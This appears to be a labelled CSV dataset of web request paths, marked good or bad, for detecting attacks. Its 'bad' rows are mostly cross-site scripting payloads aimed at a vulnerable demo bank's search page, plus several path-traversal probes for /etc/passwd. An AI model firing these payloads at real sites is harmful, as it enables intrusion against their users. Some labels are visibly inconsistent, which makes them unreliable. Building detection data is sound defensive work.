path,content,host,class_flag
/index.jsp?content=personal_deposit.htm,,demo.testfire.net,['good']
/index.jsp?content=personal_loans.htm,,demo.testfire.net,['good']
/index.jsp?content=personal_investments.htm,,demo.testfire.net,['good']
/urchin.js,,demo-analytics.testfire.net,['good']
/index.jsp?content=personal_loans.htm,,demo.testfire.net,['good']
/index.jsp?content=personal_checking.htm,,demo.testfire.net,['good']
/,,demo.testfire.net,['good']
/images/logo.gif,,demo.testfire.net,['good']
/images/header_pic.jpg,,demo.testfire.net,['good']
/favicon.ico,,demo.testfire.net,['good']
/images/gradient.jpg,,demo.testfire.net,['good']
/index.jsp?content=personal_deposit.htm,,demo.testfire.net,['good']
/index.jsp?content=business.htm,,demo.testfire.net,['good']
/index.jsp?content=business_deposit.htm,,demo.testfire.net,['good']
/images/b_deposit.jpg,,demo.testfire.net,['good']
/images/b_deposit.jpg,,demo.testfire.net,['good']
/login.jsp,,demo.testfire.net,['good']
/login.jsp/etc/passwd,,demo.testfire.net,['bad']
/login.jsp~/.mysql_history,,demo.testfire.net,['bad']
/index.jsp?content=personal_cards.htm,,demo.testfire.net,['good']
/images/p_cards.jpg,,demo.testfire.net,['good']
/images/p_cards.jpg,,demo.testfire.net,['good']
/index.jsp?content=personal_deposit.htm,,demo.testfire.net,['good']
/index.jsp?content=personal_other.htm,,demo.testfire.net,['good']
/index.jsp?content=business_lending.htm,,demo.testfire.net,['good']
/images/b_lending.jpg,,demo.testfire.net,['good']
/index.jsp?content=business_retirement.htm,,demo.testfire.net,['good']
/retirement.htm,,demo.testfire.net,['good']
/images/b_retirement.jpg,,demo.testfire.net,['good']
/index.jsp?content=inside.htm,,demo.testfire.net,['good']
/images/inside1.jpg,,demo.testfire.net,['good']
/index.jsp?content=inside_contact.htm,,demo.testfire.net,['good']
/images/inside6.jpg,,demo.testfire.net,['good']
/images/inside6.jpg,,demo.testfire.net,['good']
//etc/passwd,,demo.testfire.net,['bad']
/dvwa/vulnerabilities/fi/?page=include.php,,localhost,['good']
/v4/threatListUpdates:fetch?$ct=application/x-protobuf&key=AIzaSyC7jsptDS3am4tPx4r3nxis7IMjBc5Dovo&$httpMethod=POST&$req=ChUKE25hdmNsaWVudC1hdXRvLWZmb3gaJwgFEAEaGwoNCAUQBhgBIgMwMDEwARD1kBYaAhgHQ4-m-SICIAIoARonCAEQARobCg0IARAGGAEiAzAwMTABEP6SDhoCGAdVTBoMIgIgAigBGicIAxABGhsKDQgDEAYYASIDMDAxMAEQjooOGgIYB9VeEdAiAiACKAEaJwgHEAEaGwoNCAcQBhgBIgMwMDEwARCj2Q4aAhgHo1Mz_yICIAIoARolCAkQARoZCg0ICRAGGAEiAzAwMTABECMaAhgH9wNdlCICIAIoAQ==,,safebrowsing.googleapis.com,['bad']
/dvwa/vulnerabilities/fi/?page=include.php,,localhost,['good']
/dvwa/vulnerabilities/upload/,,localhost,['good']
/dvwa/vulnerabilities/csrf/,,localhost,['good']
/dvwa/vulnerabilities/fi/?page=include.php,,localhost,['good']
/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion,,owasp.org,['good']
/www--site-theme/assets/js/js.cookie.min.js,,owasp.org,['good']
/www--site-theme/assets/css/styles.css,,owasp.org,['good']
/www--site-theme/assets/js/jquery-3.7.1.min.js,,owasp.org,['good']
/assets/images/logo.png,,owasp.org,['good']
/www--site-theme/assets/js/util.js,,owasp.org,['good']
/www--site-theme/assets/js/kjua.min.js,,owasp.org,['good']
/www--site-theme/assets/js/yaml.min.js,,owasp.org,['good']
/www--site-theme/assets/js/js.cookie.min.js,,owasp.org,['good']
/buttons.js,,buttons.github.io,['good']
/www--site-theme/assets/js/kjua.min.js,,owasp.org,['good']
/www--site-theme/assets/js/yaml.min.js,,owasp.org,['good']
/assets/fontawesome/fa-solid-900.woff2,,owasp.org,['good']
/assets/font/ubuntu-medium.woff2,,owasp.org,['good']
/assets/fontawesome/fa-brands-400.woff2,,owasp.org,['good']
/assets/font/ubuntu-regular.woff2,,owasp.org,['good']
/www-project-web-security-testing-guide/assets/sitedata/popup-data.yml,,owasp.org,['good']
/repos/OWASP/wstg,,api.github.com,['good']
/assets/font/ubuntu-medium.woff2,,owasp.org,['good']
/assets/font/ubuntu-regular.woff2,,owasp.org,['good']
/assets/fontawesome/fa-solid-900.woff2,,owasp.org,['good']
/www--site-theme/assets/sitedata/menus.json,,owasp.org,['good']
/assets/sitedata/events.yml,,owasp.org,['good']
/assets/fontawesome/fa-brands-400.woff2,,owasp.org,['good']
/analytics.js,,www.google-analytics.com,['good']
/analytics.js,,www.google-analytics.com,['good']
/www--site-theme/assets/sitedata/menus.json,,owasp.org,['good']
/assets/sitedata/events.yml,,owasp.org,['good']
/assets/fontawesome/fa-brands-400.ttf,,owasp.org,['good']
//etc/passwd,,localhost,['bad']
/index.jsp?content=personal_deposit.htm,,demo.testfire.net,['good']
/index.jsp,,demo.testfire.net,['good']
/index.jsp?content=personal_deposit.htm,,demo.testfire.net,['good']
/index.jsp?content=personal_other.htm,,demo.testfire.net,['good']
/index.jsp?content=business_retirement.htm,,demo.testfire.net,['good']
/index.jsp?content=inside_about.htm,,demo.testfire.net,['good']
/images/inside5.jpg,,demo.testfire.net,['good']
/index.jsp?content=business.htm,,demo.testfire.net,['good']
/index.jsp?content=inside.htm,,demo.testfire.net,['good']
/cgi.exe,,demo.testfire.net,['good']
/index.jsp?content=inside_investor.htm,,demo.testfire.net,['good']
/images/inside3.jpg,,demo.testfire.net,['good']
/index.jsp?content=personal_investments.htm,,demo.testfire.net,['good']
/index.jsp?content=personal.htm,,demo.testfire.net,['good']
/index.jsp?content=personal.htm,,demo.testfire.net,['good']
/index.jsp?content=business.htm,,demo.testfire.net,['good']
/index.jsp?content=personal_deposit.htm,,demo.testfire.net,['good']
/index.jsp?content=personal_deposit.htm,,demo.testfire.net,['good']
/index.jsp?content=personal_loans.htm,,demo.testfire.net,['good']
/images/p_loans.jpg,,demo.testfire.net,['bad']
/index.jsp?content=personal_investments.htm,,demo.testfire.net,['good']
/index.jsp?content=personal_checking.htm,,demo.testfire.net,['good']
/images/p_checking.jpg,,demo.testfire.net,['bad']
/index.jsp?content=personal_loans.htm,,demo.testfire.net,['good']
/index.jsp?content=personal_checking.htm,,demo.testfire.net,['good']
/index.jsp?content=personal_loans.htm,,demo.testfire.net,['good']
/index.jsp?content=personal_cards.htm,,demo.testfire.net,['good']
/index.jsp?content=personal_investments.htm,,demo.testfire.net,['good']
/index.jsp?content=personal_deposit.htm,,demo.testfire.net,['good']
/index.jsp?content=personal_checking.htm,,demo.testfire.net,['good']
/index.jsp?content=personal_loans.htm,,demo.testfire.net,['good']
/search.jsp?query=asdasdasdas,,demo.testfire.net,['good']
/search.jsp?query=asdasdasdas,,demo.testfire.net,['good']
"/search.jsp?query=""-prompt(8)-""",,demo.testfire.net,['bad']
/search.jsp?query='-prompt(8)-',,demo.testfire.net,['bad']
"/search.jsp?query="";a=prompt,a()//",,demo.testfire.net,['bad']
"/search.jsp?query=';a=prompt,a()//",,demo.testfire.net,['bad']
"/search.jsp?query=""-eval(""window['pro'+'mpt'](8)"")-""",,demo.testfire.net,['good']
"/search.jsp?query=""onclick=prompt(8)>""@x.y",,demo.testfire.net,['bad']
/search.jsp?query=<image/src/onerror=prompt(8)>,,demo.testfire.net,['bad']
"/search.jsp?query='-eval(""window['pro'+'mpt'](8)"")-'",,demo.testfire.net,['good']
"/search.jsp?query=""onclick=prompt(8)><svg/onload=prompt(8)>""@x.y",,demo.testfire.net,['bad']
/search.jsp?query=<img/src/onerror=prompt(8)>,,demo.testfire.net,['bad']
/search.jsp?query=<image src/onerror=prompt(8)>,,demo.testfire.net,['bad']
/search.jsp?query=<img src/onerror=prompt(8)>,,demo.testfire.net,['bad']
/search.jsp?query=<image src =q onerror=prompt(8)>,,demo.testfire.net,['bad']
"/search.jsp?query=<script\x3Etype=""text/javascript"">javascript:alert(1);</script>",,demo.testfire.net,['bad']
/search.jsp?query=<img src =q onerror=prompt(8)>,,demo.testfire.net,['bad']
/search.jsp?query=</scrip</script>t><img src =q onerror=prompt(8)>,,demo.testfire.net,['bad']
"/search.jsp?query=<script\x20type=""text/javascript"">javascript:alert(1);</script>",,demo.testfire.net,['bad']
"/search.jsp?query=<script\x09type=""text/javascript"">javascript:alert(1);</script>",,demo.testfire.net,['bad']
"/search.jsp?query=<script\x0Dtype=""text/javascript"">javascript:alert(1);</script>",,demo.testfire.net,['bad']
"/search.jsp?query=<script\x0Ctype=""text/javascript"">javascript:alert(1);</script>",,demo.testfire.net,['bad']
"/search.jsp?query=<script\x2Ftype=""text/javascript"">javascript:alert(1);</script>",,demo.testfire.net,['bad']
"/search.jsp?query=<script\x0Atype=""text/javascript"">javascript:alert(1);</script>",,demo.testfire.net,['bad']
"/search.jsp?query='`""><\x3Cscript>javascript:alert(1)</script>        ",,demo.testfire.net,['bad']
"/search.jsp?query='`""><\x00script>javascript:alert(1)</script>",,demo.testfire.net,['bad']
"/search.jsp?query=<img src=1 href=1 onerror=""javascript:alert(1)""></img>",,demo.testfire.net,['bad']
"/search.jsp?query=<audio src=1 href=1 onerror=""javascript:alert(1)""></audio>",,demo.testfire.net,['bad']
"/search.jsp?query=<video src=1 href=1 onerror=""javascript:alert(1)""></video>",,demo.testfire.net,['bad']
"/search.jsp?query=<body src=1 href=1 onerror=""javascript:alert(1)""></body>",,demo.testfire.net,['bad']
"/search.jsp?query=<svg onResize svg onResize=""javascript:javascript:alert(1)""></svg onResize>",,demo.testfire.net,['bad']
"/search.jsp?query=<script src=1 href=1 onerror=""javascript:alert(1)""></script>",,demo.testfire.net,['bad']
"/search.jsp?query=<title onPropertyChange title onPropertyChange=""javascript:javascript:alert(1)""></title onPropertyChange>",,demo.testfire.net,['bad']
"/search.jsp?query=<image src=1 href=1 onerror=""javascript:alert(1)""></image>",,demo.testfire.net,['bad']
"/search.jsp?query=<iframe onLoad iframe onLoad=""javascript:javascript:alert(1)""></iframe onLoad>",,demo.testfire.net,['bad']
"/search.jsp?query=<object src=1 href=1 onerror=""javascript:alert(1)""></object>",,demo.testfire.net,['bad']
"/search.jsp?query=<body onMouseEnter body onMouseEnter=""javascript:javascript:alert(1)""></body onMouseEnter>",,demo.testfire.net,['bad']
"/search.jsp?query=<body onFocus body onFocus=""javascript:javascript:alert(1)""></body onFocus>",,demo.testfire.net,['bad']
"/search.jsp?query=<frameset onScroll frameset onScroll=""javascript:javascript:alert(1)""></frameset onScroll>",,demo.testfire.net,['bad']
"/search.jsp?query=<script onReadyStateChange script onReadyStateChange=""javascript:javascript:alert(1)""></script onReadyStateChange>",,demo.testfire.net,['bad']
"/search.jsp?query=<html onMouseUp html onMouseUp=""javascript:javascript:alert(1)""></html onMouseUp>",,demo.testfire.net,['bad']
"/search.jsp?query=<body onPropertyChange body onPropertyChange=""javascript:javascript:alert(1)""></body onPropertyChange>",,demo.testfire.net,['bad']
"/search.jsp?query=<svg onLoad svg onLoad=""javascript:javascript:alert(1)""></svg onLoad>",,demo.testfire.net,['bad']
"/search.jsp?query=<body onPageHide body onPageHide=""javascript:javascript:alert(1)""></body onPageHide>",,demo.testfire.net,['bad']
"/search.jsp?query=<body onMouseOver body onMouseOver=""javascript:javascript:alert(1)""></body onMouseOver>",,demo.testfire.net,['bad']
"/search.jsp?query=<body onUnload body onUnload=""javascript:javascript:alert(1)""></body onUnload>",,demo.testfire.net,['bad']
"/search.jsp?query=<body onLoad body onLoad=""javascript:javascript:alert(1)""></body onLoad>",,demo.testfire.net,['bad']
"/search.jsp?query=<bgsound onPropertyChange bgsound onPropertyChange=""javascript:javascript:alert(1)""></bgsound onPropertyChange>",,demo.testfire.net,['bad']
"/search.jsp?query=<html onMouseLeave html onMouseLeave=""javascript:javascript:alert(1)""></html onMouseLeave>",,demo.testfire.net,['bad']
"/search.jsp?query=<html onMouseWheel html onMouseWheel=""javascript:javascript:alert(1)""></html onMouseWheel>",,demo.testfire.net,['bad']
"/search.jsp?query=<style onLoad style onLoad=""javascript:javascript:alert(1)""></style onLoad>",,demo.testfire.net,['bad']
"/search.jsp?query=<iframe onReadyStateChange iframe onReadyStateChange=""javascript:javascript:alert(1)""></iframe onReadyStateChange>",,demo.testfire.net,['bad']
"/search.jsp?query=<body onPageShow body onPageShow=""javascript:javascript:alert(1)""></body onPageShow>",,demo.testfire.net,['bad']
"/search.jsp?query=<style onReadyStateChange style onReadyStateChange=""javascript:javascript:alert(1)""></style onReadyStateChange>",,demo.testfire.net,['bad']
"/search.jsp?query=<frameset onFocus frameset onFocus=""javascript:javascript:alert(1)""></frameset onFocus>",,demo.testfire.net,['bad']
"/search.jsp?query=<applet onError applet onError=""javascript:javascript:alert(1)""></applet onError>",,demo.testfire.net,['bad']
"/search.jsp?query=<marquee onStart marquee onStart=""javascript:javascript:alert(1)""></marquee onStart>",,demo.testfire.net,['bad']
"/search.jsp?query=<script onLoad script onLoad=""javascript:javascript:alert(1)""></script onLoad>",,demo.testfire.net,['bad']
"/search.jsp?query=<html onMouseOver html onMouseOver=""javascript:javascript:alert(1)""></html onMouseOver>",,demo.testfire.net,['bad']
"/search.jsp?query=<body onBeforeUnload body onBeforeUnload=""javascript:javascript:alert(1)""></body onBeforeUnload>",,demo.testfire.net,['bad']
"/search.jsp?query=<html onMouseEnter html onMouseEnter=""javascript:parent.javascript:alert(1)""></html onMouseEnter>",,demo.testfire.net,['bad']
"/search.jsp?query=<html onMouseDown html onMouseDown=""javascript:javascript:alert(1)""></html onMouseDown>",,demo.testfire.net,['bad']
"/search.jsp?query=<marquee onScroll marquee onScroll=""javascript:javascript:alert(1)""></marquee onScroll>",,demo.testfire.net,['bad']
"/search.jsp?query=<xml onPropertyChange xml onPropertyChange=""javascript:javascript:alert(1)""></xml onPropertyChange>",,demo.testfire.net,['bad']
"/search.jsp?query=<frameset onBlur frameset onBlur=""javascript:javascript:alert(1)""></frameset onBlur>",,demo.testfire.net,['bad']
"/search.jsp?query=<applet onReadyStateChange applet onReadyStateChange=""javascript:javascript:alert(1)""></applet onReadyStateChange>",,demo.testfire.net,['bad']
"/search.jsp?query=<svg onUnload svg onUnload=""javascript:javascript:alert(1)""></svg onUnload>",,demo.testfire.net,['bad']
"/search.jsp?query=<html onMouseOut html onMouseOut=""javascript:javascript:alert(1)""></html onMouseOut>",,demo.testfire.net,['bad']
"/search.jsp?query=<body onMouseMove body onMouseMove=""javascript:javascript:alert(1)""></body onMouseMove>",,demo.testfire.net,['bad']
"/search.jsp?query=<body onResize body onResize=""javascript:javascript:alert(1)""></body onResize>",,demo.testfire.net,['bad']
"/search.jsp?query=<object onError object onError=""javascript:javascript:alert(1)""></object onError>",,demo.testfire.net,['bad']
"/search.jsp?query=<body onPopState body onPopState=""javascript:javascript:alert(1)""></body onPopState>",,demo.testfire.net,['bad']
"/search.jsp?query=<html onMouseMove html onMouseMove=""javascript:javascript:alert(1)""></html onMouseMove>",,demo.testfire.net,['bad']
"/search.jsp?query=<applet onreadystatechange applet onreadystatechange=""javascript:javascript:alert(1)""></applet onreadystatechange>",,demo.testfire.net,['bad']
"/search.jsp?query=<body onpagehide body onpagehide=""javascript:javascript:alert(1)""></body onpagehide>",,demo.testfire.net,['bad']
"/search.jsp?query=<svg onunload svg onunload=""javascript:javascript:alert(1)""></svg onunload>",,demo.testfire.net,['bad']
"/search.jsp?query=<applet onerror applet onerror=""javascript:javascript:alert(1)""></applet onerror>",,demo.testfire.net,['bad']
"/search.jsp?query=<body onunload body onunload=""javascript:javascript:alert(1)""></body onunload>",,demo.testfire.net,['bad']
"/search.jsp?query=<body onkeyup body onkeyup=""javascript:javascript:alert(1)""></body onkeyup>",,demo.testfire.net,['bad']
"/search.jsp?query=<iframe onload iframe onload=""javascript:javascript:alert(1)""></iframe onload>",,demo.testfire.net,['bad']
"/search.jsp?query=<body onload body onload=""javascript:javascript:alert(1)""></body onload>",,demo.testfire.net,['bad']
"/search.jsp?query=<html onmouseover html onmouseover=""javascript:javascript:alert(1)""></html onmouseover>",,demo.testfire.net,['bad']
"/search.jsp?query=<object onbeforeload object onbeforeload=""javascript:javascript:alert(1)""></object onbeforeload>",,demo.testfire.net,['bad']
"/search.jsp?query=<body onbeforeunload body onbeforeunload=""javascript:javascript:alert(1)""></body onbeforeunload>",,demo.testfire.net,['bad']
"/search.jsp?query=<body onfocus body onfocus=""javascript:javascript:alert(1)""></body onfocus>",,demo.testfire.net,['bad']
"/search.jsp?query=<body onkeydown body onkeydown=""javascript:javascript:alert(1)""></body onkeydown>",,demo.testfire.net,['bad']
"/search.jsp?query=<iframe onbeforeload iframe onbeforeload=""javascript:javascript:alert(1)""></iframe onbeforeload>",,demo.testfire.net,['bad']
"/search.jsp?query=<iframe src iframe src=""javascript:javascript:alert(1)""></iframe src>",,demo.testfire.net,['bad']
"/search.jsp?query=<svg onload svg onload=""javascript:javascript:alert(1)""></svg onload>",,demo.testfire.net,['bad']
"/search.jsp?query=<html onmousemove html onmousemove=""javascript:javascript:alert(1)""></html onmousemove>",,demo.testfire.net,['bad']
"/search.jsp?query=<body onblur body onblur=""javascript:javascript:alert(1)""></body onblur>",,demo.testfire.net,['bad']
/search.jsp?query=\x3Cscript>javascript:alert(1)</script>,,demo.testfire.net,['bad']
"/search.jsp?query='""`><script>/* *\x2Fjavascript:alert(1)// */</script>",,demo.testfire.net,['bad']
/search.jsp?query=<script>javascript:alert(1)</script\x0D,,demo.testfire.net,['bad']
/search.jsp?query=<script>javascript:alert(1)</script\x0A,,demo.testfire.net,['bad']
/search.jsp?query=<script>javascript:alert(1)</script\x0B,,demo.testfire.net,['bad']
"/search.jsp?query=<script charset=""\x22>javascript:alert(1)</script>",,demo.testfire.net,['bad']
/search.jsp?query=<!--\x3E<img src=xxx:x onerror=javascript:alert(1)> -->,,demo.testfire.net,['bad']
/search.jsp?query=--><!-- ---> <img src=xxx:x onerror=javascript:alert(1)> -->,,demo.testfire.net,['bad']
/search.jsp?query=--><!-- --\x00> <img src=xxx:x onerror=javascript:alert(1)> -->,,demo.testfire.net,['bad']
/search.jsp?query=--><!-- --\x21> <img src=xxx:x onerror=javascript:alert(1)> -->,,demo.testfire.net,['bad']
/search.jsp?query=--><!-- --\x3E> <img src=xxx:x onerror=javascript:alert(1)> -->,,demo.testfire.net,['bad']
"/search.jsp?query=`""'><img src='#\x27 onerror=javascript:alert(1)>",,demo.testfire.net,['bad']
"/search.jsp?query=<a href=""javascript\x3Ajavascript:alert(1)"" id=""fuzzelement1"">test</a>",,demo.testfire.net,['bad']
"/search.jsp?query=""'`><p><svg><script>a='hello\x27;javascript:alert(1)//';</script></p>",,demo.testfire.net,['bad']
"/search.jsp?query=<a href=""javas\x00cript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",,demo.testfire.net,['bad']
"/search.jsp?query=<a href=""javas\x07cript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",,demo.testfire.net,['bad']
"/search.jsp?query=<a href=""javas\x0Dcript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",,demo.testfire.net,['bad']
"/search.jsp?query=<a href=""javas\x0Acript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",,demo.testfire.net,['bad']
"/search.jsp?query=<a href=""javas\x08cript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",,demo.testfire.net,['bad']
"/search.jsp?query=<a href=""javas\x02cript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",,demo.testfire.net,['bad']
"/search.jsp?query=<a href=""javas\x03cript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",,demo.testfire.net,['bad']
"/search.jsp?query=<a href=""javas\x04cript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",,demo.testfire.net,['bad']
"/search.jsp?query=<a href=""javas\x01cript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",,demo.testfire.net,['bad']
"/search.jsp?query=<a href=""javas\x05cript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",,demo.testfire.net,['bad']
"/search.jsp?query=<a href=""javas\x0Bcript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",,demo.testfire.net,['bad']
"/search.jsp?query=<a href=""javas\x09cript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",,demo.testfire.net,['bad']
"/search.jsp?query=<a href=""javas\x06cript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",,demo.testfire.net,['bad']
"/search.jsp?query=<a href=""javas\x0Ccript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",,demo.testfire.net,['bad']
/search.jsp?query=<script>/* *\x2A/javascript:alert(1)// */</script>,,demo.testfire.net,['bad']
/search.jsp?query=<script>/* *\x00/javascript:alert(1)// */</script>,,demo.testfire.net,['bad']
"/search.jsp?query=<style></style\x3E<img src=""about:blank"" onerror=javascript:alert(1)//></style>",,demo.testfire.net,['bad']
"/search.jsp?query=<style></style\x0D<img src=""about:blank"" onerror=javascript:alert(1)//></style>",,demo.testfire.net,['bad']
"/search.jsp?query=<style></style\x09<img src=""about:blank"" onerror=javascript:alert(1)//></style>",,demo.testfire.net,['bad']
"/search.jsp?query=<style></style\x20<img src=""about:blank"" onerror=javascript:alert(1)//></style>",,demo.testfire.net,['bad']
"/search.jsp?query=<style></style\x0A<img src=""about:blank"" onerror=javascript:alert(1)//></style>",,demo.testfire.net,['bad']
"/search.jsp?query=""'`>ABC<div style=""font-family:'foo'\x7Dx:expression(javascript:alert(1);/*';"">DEF ",,demo.testfire.net,['bad']
"/search.jsp?query=""'`>ABC<div style=""font-family:'foo'\x3Bx:expression(javascript:alert(1);/*';"">DEF ",,demo.testfire.net,['bad']
/search.jsp?query=%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,,demo.testfire.net,['bad']
"/search.jsp?query=<script>if(""x\\xE1\x96\x89"".length==2) { javascript:alert(1);}</script>",,demo.testfire.net,['bad']
"/search.jsp?query=<script>if(""x\\xE0\xB9\x92"".length==2) { javascript:alert(1);}</script>",,demo.testfire.net,['bad']
"/search.jsp?query=<script>if(""x\\xEE\xA9\x93"".length==2) { javascript:alert(1);}</script>",,demo.testfire.net,['bad']
"/search.jsp?query='`""><\x3Cscript>javascript:alert(1)</script>",,demo.testfire.net,['bad']
"/search.jsp?query='`""><\x00script>javascript:alert(1)</script>",,demo.testfire.net,['bad']
"/search.jsp?query=""'`><\x3Cimg src=xxx:x onerror=javascript:alert(1)>",,demo.testfire.net,['bad']
"/search.jsp?query=""'`><\x00img src=xxx:x onerror=javascript:alert(1)>",,demo.testfire.net,['bad']
"/search.jsp?query=<script src=""data:text/plain\x2Cjavascript:alert(1)""></script>",,demo.testfire.net,['bad']
"/search.jsp?query=<script src=""data:\xD4\x8F,javascript:alert(1)""></script>",,demo.testfire.net,['bad']
"/search.jsp?query=<script src=""data:\xE0\xA4\x98,javascript:alert(1)""></script>",,demo.testfire.net,['bad']
"/search.jsp?query=<script src=""data:\xCB\x8F,javascript:alert(1)""></script>",,demo.testfire.net,['bad']
"/search.jsp?query=<script\x20type=""text/javascript"">javascript:alert(1);</script>",,demo.testfire.net,['bad']
"/search.jsp?query=<script\x3Etype=""text/javascript"">javascript:alert(1);</script>",,demo.testfire.net,['bad']
"/search.jsp?query=<script\x0Dtype=""text/javascript"">javascript:alert(1);</script>",,demo.testfire.net,['bad']
"/search.jsp?query=<script\x09type=""text/javascript"">javascript:alert(1);</script>",,demo.testfire.net,['bad']
"/search.jsp?query=<script\x0Ctype=""text/javascript"">javascript:alert(1);</script>",,demo.testfire.net,['bad']
"/search.jsp?query=<script\x2Ftype=""text/javascript"">javascript:alert(1);</script>",,demo.testfire.net,['bad']
"/search.jsp?query=<script\x0Atype=""text/javascript"">javascript:alert(1);</script>",,demo.testfire.net,['bad']
"/search.jsp?query=ABC<div style=""x\x3Aexpression(javascript:alert(1)"">DEF",,demo.testfire.net,['bad']
"/search.jsp?query=ABC<div style=""x:expression\x5C(javascript:alert(1)"">DEF",,demo.testfire.net,['bad']
"/search.jsp?query=ABC<div style=""x:expression\x00(javascript:alert(1)"">DEF",,demo.testfire.net,['bad']
"/search.jsp?query=ABC<div style=""x:exp\x00ression(javascript:alert(1)"">DEF",,demo.testfire.net,['bad']
"/search.jsp?query=ABC<div style=""x:exp\x5Cression(javascript:alert(1)"">DEF",,demo.testfire.net,['bad']
"/search.jsp?query=ABC<div style=""x:\x0Aexpression(javascript:alert(1)"">DEF",,demo.testfire.net,['bad']
"/search.jsp?query=ABC<div style=""x:\xE3\x80\x80expression(javascript:alert(1)"">DEF",,demo.testfire.net,['bad']
"/search.jsp?query=ABC<div style=""x:\x09expression(javascript:alert(1)"">DEF",,demo.testfire.net,['bad']
"/search.jsp?query=ABC<div style=""x:\xE2\x80\x84expression(javascript:alert(1)"">DEF",,demo.testfire.net,['bad']
"/search.jsp?query=ABC<div style=""x:\xC2\xA0expression(javascript:alert(1)"">DEF",,demo.testfire.net,['bad']
"/search.jsp?query=ABC<div style=""x:\xE2\x80\x80expression(javascript:alert(1)"">DEF",,demo.testfire.net,['bad']
"/search.jsp?query=ABC<div style=""x:\xE2\x80\x8Aexpression(javascript:alert(1)"">DEF",,demo.testfire.net,['bad']
"/search.jsp?query=ABC<div style=""x:\x0Dexpression(javascript:alert(1)"">DEF",,demo.testfire.net,['bad']
"/search.jsp?query=ABC<div style=""x:\x0Cexpression(javascript:alert(1)"">DEF",,demo.testfire.net,['bad']
"/search.jsp?query=ABC<div style=""x:\xE2\x80\x87expression(javascript:alert(1)"">DEF",,demo.testfire.net,['bad']
"/search.jsp?query=ABC<div style=""x:\xEF\xBB\xBFexpression(javascript:alert(1)"">DEF",,demo.testfire.net,['bad']
"/search.jsp?query=ABC<div style=""x:\x20expression(javascript:alert(1)"">DEF",,demo.testfire.net,['bad']
"/search.jsp?query=ABC<div style=""x:\xE2\x80\x88expression(javascript:alert(1)"">DEF",,demo.testfire.net,['bad']
"/search.jsp?query=ABC<div style=""x:\x00expression(javascript:alert(1)"">DEF",,demo.testfire.net,['bad']
"/search.jsp?query=ABC<div style=""x:\xE2\x80\x8Bexpression(javascript:alert(1)"">DEF",,demo.testfire.net,['bad']
"/search.jsp?query=ABC<div style=""x:\xE2\x80\x86expression(javascript:alert(1)"">DEF",,demo.testfire.net,['bad']
"/search.jsp?query=ABC<div style=""x:\xE2\x80\x85expression(javascript:alert(1)"">DEF",,demo.testfire.net,['bad']
"/search.jsp?query=ABC<div style=""x:\xE2\x80\x82expression(javascript:alert(1)"">DEF",,demo.testfire.net,['bad']
"/search.jsp?query=ABC<div style=""x:\x0Bexpression(javascript:alert(1)"">DEF",,demo.testfire.net,['bad']
"/search.jsp?query=ABC<div style=""x:\xE2\x80\x81expression(javascript:alert(1)"">DEF",,demo.testfire.net,['bad']
"/search.jsp?query=ABC<div style=""x:\xE2\x80\x83expression(javascript:alert(1)"">DEF",,demo.testfire.net,['bad']
"/search.jsp?query=ABC<div style=""x:\xE2\x80\x89expression(javascript:alert(1)"">DEF",,demo.testfire.net,['bad']
"/search.jsp?query=<a href=""\x0Bjavascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",,demo.testfire.net,['bad']
"/search.jsp?query=<a href=""\x0Fjavascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",,demo.testfire.net,['bad']
"/search.jsp?query=<a href=""\xC2\xA0javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",,demo.testfire.net,['bad']
"/search.jsp?query=<a href=""\x05javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",,demo.testfire.net,['bad']
"/search.jsp?query=<a href=""\xE1\xA0\x8Ejavascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",,demo.testfire.net,['bad']
